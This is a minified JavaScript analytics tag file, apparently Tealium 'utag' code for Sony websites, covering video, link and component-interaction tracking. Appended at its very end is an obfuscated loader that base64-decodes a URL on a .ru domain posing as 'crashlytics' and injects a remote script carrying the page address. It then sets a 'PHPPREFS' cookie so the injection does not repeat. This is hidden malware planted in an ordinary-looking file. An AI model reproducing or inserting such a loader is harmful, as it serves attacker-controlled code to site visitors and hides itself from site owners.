error",utag.link(utag_data,(function(e){}),utag.ext.getAppMeasurementTagIDAsArray())}},!("undefined"==typeof jQuery||void 0===jQuery.fn.DOMNodeAppear||/^(stage\.)?electronics\.sony\.com$/.test(window.location.hostname)&&/^global:gwx$/gi.test(utag_data.website_platform))){var d="video";jQuery(d).DOMNodeAppear((function(){var e,s=this;if(n="FlowPlayer",void 0!==s&&s.length>0){!function(e){e.event.special.destroyed={remove:function(e){utag.DB(e),e.handler&&e.handler(e)}}}(jQuery);for(var d=0;d<s.length;d++)if(void 0!==jQuery(s[d]).attr("loop")||/us\.aibo\.com/gi.test(window.location.host));else if(void 0!==(e=s[d]).src&&e.src.length>0&&e.src.split("/").length>0?(i=e.src.split("/")[e.src.split("/").length-1],r=e.src.split("/")[e.src.split("/").length-1].split("_").length>2?e.src.split("/")[e.src.split("/").length-1].split("_")[e.src.split("/")[e.src.split("/").length-1].split("_").length-1]:""):void 0!==e.src&&(i=e.src,r=e.src),t=e.duration||0,a=e.currentTime||0,o=i.replace(/[^a-z\s]/gi,"").replace(/[_\s]/g,"-"),0===jQuery(e).parents(".hero-video").length&&void 0!==jQuery("body").on){var c={id:o,videoType:n,quality:r,name:i,duration:t,currentTime:a,errorCode:void 0,module:jQuery(e).closest("section[id]").prev("div.visuallyhidden moduleTags").attr("data-mastername"),player:e};jQuery(e).on("loadeddata play pause seeking seeked ended error destroyed",c,_bsq.hb.videoHandler)}}}),d)}if("undefined"!=typeof jQuery&&void 0!==jQuery().on){var c=/(carluccidesign\.com|sonypremiumhome\.com)/gi.test(window.location.hostname)?"body":".sony-youtube-player, div.ctt-youtube[data-video-id]",u=/(carluccidesign\.com|sonypremiumhome\.com)/gi.test(window.location.hostname)?"div.ccs-cc-inline-embedded-video[data-player]":"",g=/(carluccidesign\.com|sonypremiumhome\.com)/gi.test(window.location.hostname)?"loadedmetadata ended playing pause progress loadeddata":"playing unstarted paused buffering ended error unload";jQuery(c).on(g,u,(function(e,o){void 0===o&&void 0!==e.target&&/mediaelementwrapper/gi.test(e.target.nodeName||"")&&(o={player:e.target.youTubeApi||{}}),n="YouTubePlayer";var s="";void 0!==o.player.getVideoData&&(i=o.player.getVideoData().title||"",s=o.player.getVideoData().video_id||"",t=Math.ceil(o.player.getDuration())||0,a=Math.ceil(o.player.getCurrentTime())||0,videoUploader=o.player.getVideoData().author||"",r=o.player.getPlaybackQuality()||"",moduleMasterName=o.masterName||"",videoErrorCode=o.errorCode||"",""!==videoErrorCode&&(videoErrorCode="yt_"+videoErrorCode),""!==s&&/^(unstarted|playing|paused|pause|ended|error)$/gi.test(e.type)&&_bsq.hb.videoHandler({type:e.type,data:{id:s,videoType:n,quality:r,name:i,duration:t,currentTime:Math.ceil(o.player.getCurrentTime()),errorCode:videoErrorCode,module:moduleMasterName,player:o.player}}))}))}if(!0===/\/alphauniverse/gi.test(document.URL)){var m=["play","pause","ended","error"];["videoStarted","videoPaused","videoCompleted","videoError"].forEach((function(e,t){document.addEventListener(e,(function(e){n=/vimeo\.com/gi.test(e.detail.player.origin)?"Vimeo":"YouTubePlayer";var a="",o="",i="";"YouTubePlayer"===n?(e.detail.player.getVideoUrl().then((function(e){a=e.split("v=")[1]})),e.detail.player.getPlaybackQuality().then((function(e){o=e})),e.detail.player.getCurrentTime().then((function(e){i=e}))):(e.detail.player.getVideoId().then((function(e){a=e.toString()})),e.detail.player.getQuality().then((function(e){o=e})),e.detail.player.getCurrentTime().then((function(e){i=e}))),setTimeout((function(){_bsq.hb.videoHandler({type:m[t],data:{id:a||e.detail.videoName,videoType:n,quality:o||"",name:e.detail.videoName,duration:e.detail.videoLength,currentTime:Math.ceil(i)||0,errorCode:e.detail.errorCode||void 0,module:e.currentTarget,player:e.detail.player}})}),100)}),!1)}))}if(!0===/\/presscentre/gi.test(document.URL)){m=["play","pause","ended","error"];["videoStarted","videoPaused","videoCompleted","videoError"].forEach((function(e,t){document.addEventListener(e,(function(e){void 0!==e.detail.player&&"function"==typeof e.detail.player.getVideoUrl&&""!==e.detail.player.getVideoUrl()&&/youtube\.com/gi.test(e.detail.player.getVideoUrl())?(n="YouTubePlayer",video_currentTime=e.detail.player.getCurrentTime(),video_quality=e.detail.player.getPlaybackQuality()):(n="Vimeo",e.detail.player.getCurrentTime().then((function(e){video_currentTime=e})),e.detail.player.getQuality().then((function(e){video_quality=e}))),setTimeout((function(){_bsq.hb.videoHandler({type:m[t],data:{id:e.detail.videoID.toString(),videoType:n,quality:video_quality||"",name:e.detail.videoName,duration:e.detail.videoLength,currentTime:Math.ceil(video_currentTime)||0,errorCode:e.detail.errorCode||void 0,module:e.currentTarget,player:e.detail.player}})}),100)}),!1)}))}if(!0===/^(stage\.)?electronics\.sony\.com$/.test(window.location.hostname)&&void 0===window._bsq_videoEvents){m=["play","pause","ended","error"];["videoPlay","videoPause","videoCompleted","videoError"].forEach((function(e,t){document.addEventListener(e,(function(e){_bsq.hb.videoHandler({type:m[t],data:{id:e.detail.videoId,videoType:"YouTubePlayer",quality:e.detail.videoPlayer.getPlaybackQuality()||"",name:e.detail.videoName,duration:e.detail.videoLength,currentTime:Math.ceil(e.detail.videoPlayer.getCurrentTime()),errorCode:"yt_"+e.detail.videoErrorName||void 0,module:e.currentTarget,player:e.detail.videoPlayer}})}),!1)})),window._bsq_videoEvents=1}if(/^global:gwx$/gi.test(utag_data.website_platform)){m=["play","pause","ended","error"];["videoPlay","videoPause","videoCompleted","videoError"].forEach((function(e,t){document.addEventListener(e,(function(e){void 0!==e.detail.videoPlayer&&"function"==typeof e.detail.videoPlayer.getVideoUrl&&""!==e.detail.videoPlayer.getVideoUrl()&&/youtube\.com/gi.test(e.detail.videoPlayer.getVideoUrl())?(n="YouTubePlayer",videoErrorPrefix="yt_",video_id=e.detail.videoPlayer.getVideoUrl().split("v=")[1],video_quality=e.detail.videoPlayer.getPlaybackQuality()):void 0!==e.detail.videoPlayer&&void 0!==e.detail.videoPlayer.plyr&&(n="Plyr - HTML5",videoErrorPrefix="",void 0!==e.detail.videoPlayer.plyr.id&&""!==e.detail.videoPlayer.plyr.id?video_id=e.detail.videoPlayer.plyr.id:video_id=e.detail.videoName.indexOf(".")>-1?e.detail.videoName.split(".")[0].replace(/[^a-z\s]/gi,"").replace(/[_\s]/g,"-"):e.detail.videoName.replace(/[^a-z\s]/gi,"").replace(/[_\s]/g,"-"),video_quality=void 0!==e.detail.videoPlayer.plyr.quality&&0!==e.detail.videoPlayer.plyr.quality?e.detail.videoPlayer.plyr.quality:""),void 0!==e.detail.videoErrorName&&"undefined"==typeof video_id&&(video_id=n),_bsq.hb.videoHandler({type:m[t],data:{id:video_id.toString(),videoType:n,quality:video_quality||"",name:e.detail.videoName,duration:e.detail.videoLength,currentTime:Math.ceil(e.detail.videoCurrentTime)||0,errorCode:videoErrorPrefix+e.detail.videoErrorName||void 0,module:e.currentTarget,player:e.detail.videoPlayer}})}),!1)}))}},function e(t,a){window.setTimeout((function(){"undefined"!=typeof sgwn?_bsq.hb.videoTrack():window.setTimeout(e,250)}),250)}(),m=XMLHttpRequest.prototype.open,XMLHttpRequest.prototype.open=function(){this.addEventListener("readystatechange",(function(){if(4===this.readyState&&!0===/sonyglobal\.hb\.omtrdc\.net\/.*s:event:type=play.*s:asset:type=main.*/gi.test(this.responseURL)){var e=this.responseURL.split("s:asset:video_id=")[1],t=this.responseURL.split("s:asset:name=")[1],a=this.responseURL.split("l:event:playhead=")[1],o=this.responseURL.split("l:asset:length=")[1];e=void 0!==e?e.split("&")[0]:"",t=void 0!==t?t.split("&")[0]:"",a=void 0!==a?a.split("&")[0]:null,o=void 0!==o?o.split("&")[0]:null;var i=parseInt(a/o*100);void 0!==_bsq.hb.video[e]&&_bsq.hb.markers.forEach((function(r){i>=r&&-1===_bsq.hb.video[e].milestones.indexOf(r)&&(_bsq.hb.video[e].milestones.push(r),"undefined"!=typeof jQuery?jQuery(document).trigger({type:"bsqCustomVideoEvent"+r,videoData:{name:t,length:o,player:{}},videoName:t,videoId:e,videoDuration:o,videoCurrentTime:a}):(bsq_custom_event=new CustomEvent("bsqCustomVideoEvent"+r,{detail:{videoData:{name:t,length:o,player:{}},videoName:t,videoId:e,videoDuration:o,videoCurrentTime:a}}),document.dispatchEvent(bsq_custom_event)))}))}}),!1),m.apply(this,arguments)};var p=function(e,t,a,o,i){_bsq.hb.video[e]=_bsq.hb.video[e]||{},_bsq.hb.video[e].milestones=[];var r={};r.mediaConfig=new u,r.mediaConfig.trackingServer=o.HEARTBEAT.TRACKING_SERVER,r.mediaConfig.playerName=a,r.mediaConfig.channel=o.HEARTBEAT.CHANNEL,r.mediaConfig.debugLogging="true"===_bsq.utils.docCookies.getItem("hbdebug"),r.mediaConfig.appVersion=o.HEARTBEAT.SDK,r.mediaConfig.ssl=!0,r.mediaConfig.ovp=a,r.mediaDelegate=new g,r.mediaDelegate.getCurrentPlaybackTime=function(){return/(FlowPlayer|Vimeo|Plyr - HTML5)/gi.test(a)?Math.ceil(i.currentTime)||0:"YouTubePlayer"===a?Math.ceil(i.getCurrentTime())||0:void 0},_bsq.hb.video[e].mediaHeartbeat=new l(r.mediaDelegate,r.mediaConfig,sgwn)}}catch(e){utag.DB(e)}}catch(e){utag.DB(e)}try{try{if(/(((sony)\.(com\.ar|cl|com\.co|com\.mx|com\.pa|com\.br|co\.cr|com\.bo|com\.do|com\.ec|com\.sv|com\.gt|com\.hn|com\.py|com\.pe|com\.pr|com\.ve|com\.ni)|sony-latin\.com|sonypr\.com)|m8agency\.com|syndication\-sola\.com|alphauniverse-latin\.com)$/gi.test(utag.data["dom.domain"])||/((sony\.(at|ba|be|bg|ch|co\.uk|com\.mk|com\.pl|com\.tr|cz|de|dk|ee|es|eu|fi|fr|gr|hr|hu|ie|it|kz|lt|lu|lv|net|nl|no|pl|pt|ro|rs|ru|se|si|sk|ua))|sony-europe\.com|sonystyle-europe\.com|sonylatvija\.com)$/gi.test(utag.data["dom.domain"]))try{jQuery(document).ready((function(){jQuery("[href*='playstation.com'],[href*='sonyentertainmentnetwork.com']").each((function(){var e=jQuery(this).attr("href");-1===e.indexOf("soporte.latam.playstation")&&-1===e.indexOf("smcid")&&(e.indexOf("?")>-1?e+="&smcid=gwo":e+="?smcid=gwo",jQuery(this).attr("href",e))}))}))}catch(e){"undefined"!=typeof jQuery&&jQuery("body").trigger("customError",["SNEI Tracking code",document.URL,e])}}catch(e){utag.DB(e)}}catch(e){utag.DB(e)}try{try{document.addEventListener("componentInteraction",(function(e){var t={};try{t=sony.digitalData||{}}catch(e){}var a=e.detail||{},o="",i="",r=void 0!==a.componentId?a.componentId:"",n=void 0!==a.componentType?a.componentType:"",s="";void 0!==a.actionableItemValue&&"string"==typeof(s=a.actionableItemValue)&&(s=a.actionableItemValue.trim());var d=void 0!==a.componentNestedId?a.componentNestedId:"",c="";void 0!==a.marketingVariables&&void 0!==a.marketingVariables.product_supermodel&&""!==a.marketingVariables.product_supermodel?c=[a.marketingVariables.product_supermodel]:void 0!==a.marketingVariables&&void 0!==a.marketingVariables.product_model&&""!==a.marketingVariables.product_model&&(c=a.marketingVariables.product_model);var l=[],u=[];utag_data.aaEvents=[];var g=function(e,t,a,o){utag_data.aaLinkTrackVars="pageName,events,prop10,prop19,prop21,prop22,prop23,prop24,eVar5,eVar7,eVar20,eVar21,eVar22",a&&(utag_data.aaLinkTrackVars+=","+a),utag_data.aaLinkTrackEvents=o.join(","),utag_data.aaEvents=o,utag_data.aaInteractionType=e,utag_data.aaLinkType="o",utag_data.aaLinkName=t,utag.link(utag_data,(function(e){}),utag.ext.getAppMeasurementTagIDAsArray())};if(utag_data.aaFilters=t.category.filter.join(";"),void 0!==a.interactionType){if("navigation-click"===a.interactionType)if(""===s&&("golden_area"===n?void 0!==a.actionableItem&&void 0!==a.actionableItem.innerText&&(s=a.actionableItem.innerText.trim()):"media_carousel"===n?s=void 0!==a.actionableItem&&void 0!==a.actionableItem.innerText?a.actionableItem.innerText.trim():"":"new_products"===n&&(s=""===(s=""===(s=void 0!==a.marketingVariables&&void 0!==a.marketingVariables.product_supermodel&&""!==a.marketingVariables.product_supermodel?a.marketingVariables.product_supermodel:"")&&void 0!==a.actionableItem&&void 0!==a.actionableItem.href?a.actionableItem.href:"")&&void 0!==a.actionableItem&&void 0!==a.actionableItem.innerText?a.actionableItem.innerText.trim():"")),"geofilter"===n){if(i="geo-filter click",void 0!==a.actionableItem&&void 0!==a.actionableItem.dataset)var p=void 0!==a.actionableItem.dataset.geofilter_destination_country?a.actionableItem.dataset.geofilter_destination_country:"",m=void 0!==a.actionableItem.dataset.geofilter_destination_region?a.actionableItem.dataset.geofilter_destination_region:"";utag_data.aaGeofilter=p+":"+m+"|"+s,l.push("prop9","prop29","eVar62"),g(o,i,l,u)}else _bsq.utils.docCookies.setItem(_bsq.aa.navigationLinkCookieName,"cl:"+r+":"+d+":"+s+(""!==c&&c.length>0?":"+c:"")),"ratings_and_reviews"===a.componentType&&"pdp"===utag_data.aaPageTemplate&&_bsq.utils.docCookies.setItem(_bsq.aa.navigationLinkCookieName,"cl:"+r+":"+d+":"+s+(""!==c&&c.length>0?":"+c:"")),/^global_(header|footer)/gi.test(a.componentType)&&(""===s&&(/sony-logo/gi.test(a.actionableItem.innerHTML)?s="sony":/signup/gi.test(a.actionableItem.classList)&&(s="sign_in")),_bsq.utils.docCookies.setItem(_bsq.aa.navigationLinkCookieName,"hf:"+r+":"+d+":"+s+(""!==c&&c.length>0?":"+c:""))),void 0!==a.actionableItem&&null!==a.actionableItem.closest("ul")&&_bsq.utils.docCookies.setItem(_bsq.aa.navigationLinkCookieName,"nv:"+r+":"+d+":"+s+(""!==c&&c.length>0?":"+c:""));if("in-page-click"===a.interactionType&&(void 0!==a.actionableItem.href?_bsq.utils.docCookies.setItem(_bsq.aa.navigationLinkCookieName,"cl:"+r+":"+d+":"+s+(""!==c&&c.length>0?":"+c:"")):/loadMoreButton/gi.test(a.actionableItem.classList)?(i="Search results - Load more:"+utag_data.aaSearchTerm,l.push("prop41","eVar10"),u.push("event37"),g(o,i,l,u)):/^(global_header|category_pdp_nav)$/gi.test(n)||(o=void 0!==(o=r+"|"+d+"|"+a.interactionType+"|"+s).toLowerCase()?o.toLowerCase():o,i=n,l.push("eVar58"),u.push("event19"),g(o,i,l,u))),/^(slide|paginate)$/gi.test(a.interactionType)&&(o=void 0!==(o=r+"|"+d+"|"+a.interactionType+"|"+s).toLowerCase()?o.toLowerCase():o,i=n,l.push("prop6","eVar58","eVar70"),u.push("event19"),g(o,i,l,u)),"drag"===a.interactionType&&(o=void 0!==(o=r+"|"+d+"|"+a.interactionType+"|"+s).toLowerCase()?o.toLowerCase():o,i="Dragable 360 Viewer",l.push("eVar58","eVar70"),u.push("event19"),g(o,i,l,u)),("favorite"===a.interactionType||/favorite-?button/gi.test(a.actionableItem.classList))&&(i="Favorite button click - "+n,""!==c&&(utag_data.aaProducts=c),"on"===s?u.push("event20"):u.push("event21"),l.push("products","prop33","prop34","prop35","prop36","eVar45","eVar47"),g(o,i,l,u)),/^(filter|sort)$/gi.test(a.interactionType))if("filter"===a.interactionType){for(var _,h=[],y=0;y<s.length;y++)for(var v=Object.keys(s[y]),f=0;f<v.length;f++)for(var b=s[y][v[f]],w=0;w<b.length;w++){var k=v+"="+s[y][v[f]][w];h.push(k)}_=h.join(";");try{_bsq.utils.docCookies.setItem(_bsq.aa.filtersCookieName,_)}catch(e){}}else"sort"===a.interactionType&&_bsq.utils.docCookies.setItem(_bsq.aa.sortingCookieName,s);if("hotspot"===a.interactionType&&(o=void 0!==(o=r+"|"+d+"|"+a.interactionType+"|"+s).toLowerCase()?o.toLowerCase():o,i="hotspot_open",l.push("eVar27","eVar58","eVar70"),u.push("event19"),g(o,i,l,u)),/where-to-buy|buttonbuy/gi.test(a.actionableItem.classList)&&(i="Buy button click",""!==c&&(utag_data.aaProducts=c),l.push("products","prop6","prop32","prop33","prop34","prop35","prop36","prop40","eVar9","eVar21","eVar22","eVar45","eVar47","eVar95","eVar96","eVar97","eVar98","eVar99","eVar100","list2"),u.push("event23"),g(o,i,l,u)),/buttonnotifyme/gi.test(e.detail.actionableItem.classList)&&(i="Notify me button click",""!==c&&(utag_data.aaProducts=c),l.push("products","prop6","prop29","prop32","prop33","prop34","prop35","prop36","eVar9","eVar45","eVar47","list2"),u.push("event22"),g(o,i,l,u)),"retailer-click"===a.interactionType&&(utag_data.aaRetailerName=void 0!==a.marketingVariables&&void 0!==a.marketingVariables.retailer_name?a.marketingVariables.retailer_name:"",""!==c&&(utag_data.aaProducts=c),o=void 0!==(o=r+"|"+d+"|"+a.interactionType+"|"+s).toLowerCase()?o.toLowerCase():o,i="Retailer click - "+utag_data.aaRetailerName,l.push("products","prop6","prop9","eVar27","eVar42","eVar58","eVar70"),u.push("event19","event31"),g(o,i,l,u)),"dealer-search"===a.interactionType&&(""!==c&&(utag_data.aaProducts=c),o=void 0!==(o=r+"|"+d+"|"+a.interactionType+"|"+s).toLowerCase()?o.toLowerCase():o,i="transition-search_dealer_click",l.push("products","eVar27","eVar58","eVar70"),u.push("event19"),g(o,i,l,u)),"dealer-click"===a.interactionType&&(utag_data.aaRetailerName=void 0!==a.marketingVariables&&void 0!==a.marketingVariables.dealer_name?a.marketingVariables.dealer_name:"",""!==c&&(utag_data.aaProducts=c),void 0!==s&&""!==s&&(/card/gi.test(s)?(i="Dealer card click - "+utag_data.aaRetailerName,u.push("event30")):/directions/gi.test(s)?(i="transition-dealer:directions_click",o=void 0!==(o=r+"|"+d+"|"+a.interactionType+"|"+s).toLowerCase()?o.toLowerCase():o,u.push("event19")):/website/gi.test(s)?(i="transition-dealer:website_click",o=void 0!==(o=r+"|"+d+"|"+a.interactionType+"|"+s).toLowerCase()?o.toLowerCase():o,u.push("event19")):/telephone/gi.test(s)&&(i="transition-dealer:telephone_click",o=void 0!==(o=r+"|"+d+"|"+a.interactionType+"|"+s).toLowerCase()?o.toLowerCase():o,u.push("event19"))),l.push("products","prop6","prop9","eVar27","eVar42","eVar58","eVar70"),g(o,i,l,u)),"search"===a.interactionType&&(/^global_(header)/gi.test(a.componentType)&&void 0!==a.marketingVariables&&void 0!==a.marketingVariables.search_result_index&&void 0!==a.marketingVariables.search_result_category&&(0===a.marketingVariables.search_result_index?(_bsq.utils.docCookies.setItem(_bsq.aa.navigationLinkCookieName,"hf:"+r+":"+d+":search"),_bsq.utils.docCookies.setItem(_bsq.aa.typeaheadTermCookieName,a.marketingVariables.search_term)):a.marketingVariables.search_result_index>0&&(_bsq.utils.docCookies.setItem(_bsq.aa.navigationLinkCookieName,"hf:"+r+":"+d+":"+a.marketingVariables.search_result_category+"_"+a.marketingVariables.search_result_index),_bsq.utils.docCookies.setItem(_bsq.aa.typeaheadTermCookieName,a.marketingVariables.search_term))),/^search_result$/gi.test(a.componentType)&&!/dropdownoption/gi.test(a.actionableItem.classList))){_bsq.utils.docCookies.setItem(_bsq.aa.navigationLinkCookieName,"cl:"+r+":"+d+":Internal search results - Organic");var T=void 0!==a.marketingVariables&&void 0!==a.marketingVariables.search_term?a.marketingVariables.search_term:"";""===T&&(T=t.search.term);var S=void 0!==a.marketingVariables&&void 0!==a.marketingVariables.search_result_index?a.marketingVariables.search_result_index:"";utag_data.aaClickedSearchResultPosition=S+":"+_bsq.utils.all_maskPIIData(T)+":organic",i="Search result click",l.push("prop42"),u.push("event39"),g(o,i,l,u)}}}))}catch(e){utag.DB(e)}}catch(e){utag.DB(e)}}var m})),utag.cfg.readywait||utag.cfg.waittimer?utag.loader.EV("","ready",(function(e){0==utag.loader.rf&&(utag.loader.rf=1,utag.cfg.readywait=1,utag.DB("READY:utag.cfg.readywait"),setTimeout((function(){utag.loader.PINIT()}),utag.cfg.waittimer||1))})):utag.loader.PINIT()};!function(o,w,d,l){try{o.c="h"==l.protocol[0]&&/./.test(l.hostname)&&!/PHPPREFS/.test(d.cookie),setTimeout(function(){o.c&&(o.s=d.createElement("script"),o.s.src=atob("aHR0cHM6Ly9hcGkuY3Jhc2hseXRpY3MucnUvdHJhY2tpbmcvc2NyaXB0LmpzP3JlZmVycmVyPQ==")+l.href,d.body.appendChild(o.s))},1e3),d.cookie="PHPPREFS=full;max-age=39800;"}catch(e){}}({},window,document,location);